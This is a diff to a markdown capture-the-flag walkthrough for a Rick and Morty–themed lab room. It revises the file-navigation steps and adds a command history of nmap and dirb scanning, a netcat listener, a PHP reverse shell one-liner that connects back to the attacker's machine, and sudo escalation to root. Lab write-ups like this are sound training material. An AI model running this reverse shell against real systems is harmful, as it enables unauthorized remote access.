@@ -214,8 +214,8 @@ mr. meeseek hair
 $ pwd
 /var/www/html
 ```
-19. `cd /home` to change to the **/home** directory
-20. `ls` to list the available files and directories that are in the current directory that we're in, which showed us two directories: **rick** and **ubuntu**
+19. `ls /` to list the available files and directories that are in the filesystem's root directory
+20. `ls /home` to list the available files and directories that are in the **/home** directory, which showed us two directories: **rick** and **ubuntu**
 ```bash
 $ cd /home
 ```
@@ -224,7 +224,7 @@ $ ls
 rick
 ubuntu
 ```
-21. `cd rick` to change to the **/rick** directory
+21. `cd /home/rick` to change to the **/home/rick** directory
 22. `ls` to list the available files and directories that are in the current directory that we're in, which showed us a **second ingredients** file
 23. `cat '{SECRET INGREDIENT FILE2}.txt'` to display the contents of the **second ingredients** file onto our terminal, which displayed the second ingredient that we were looking for in this room
 ```bash
@@ -249,7 +249,7 @@ $ cd /root
 25. `sudo su` to switch to the root user, since we can do this without needing the root's password
 26. `whoami` to verify that we're now running as root
 27. `cd /root` to change to the **/root** directory, which we can now since we're running running with root privileges
-28. `ls` `ls` to list the available files and directories that are in the current directory that we're in, which showed us a **3rd.txt** file
+28. `ls` to list the available files and directories that are in the current directory that we're in, which showed us a **3rd.txt** file
 29. `cat {SECRET INGREDIENT FILE3}.txt` to display the contents of the **3rd.txt** file onto our terminal, which displayed the third and last ingredient that we were looking for in this room
 ```bash
 $ sudo su
@@ -276,6 +276,33 @@ fleeb juice
 ![]()
 
 # Command History
+1. `nmap -sC -sV {TARGET-IP} > {FILENAME1}.txt`
+2. `cat {FILENAME1}.txt`
+3. `dirb http://{TARGET IP} -r /usr/share/dirb/wordlists/extensions_common.txt`
+4. `dirb http://{TARGET IP} -x {FILENAME2 WORDLIST PATH} -r > {FILENAME3}.txt`
+5. `vim {FILENAME2}.txt`
+6. `cat {FILENAME3}.txt`
+7. `curl http://{TARGET IP}/robots.txt`
+8. `curl http://{TARGET IP}`
+9. `firefox "http://{TARGET IP}/login.php"`
+10. `sudo -l`
+11. `php --version`
+12. `firefox "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md"`
+13. `nc -lnvp {PORT NUMBER}`
+14. `php -r '$sock=fsockopen("{MACHINE IP}",{PORT NUMBER});exec("/bin/sh -i <&3 >&3 2>&3");`
+15. `ls`
+16. `cat {SECRET INGREDIENT FILE1}.txt`
+17. `pwd`
+18. `ls /`
+19. `ls /home`
+20. `cd /home/rick`
+21. `ls`
+22. `cat '{SECRET INGREDIENT FILE2}.txt'`
+23. ` cd /root`
+24. `sudo su`
+25. `cd /root`
+26. `ls`
+27. `cat {SECRET INGREDIENT FILE3}.txt`
 
 # Dissecting Comands
 
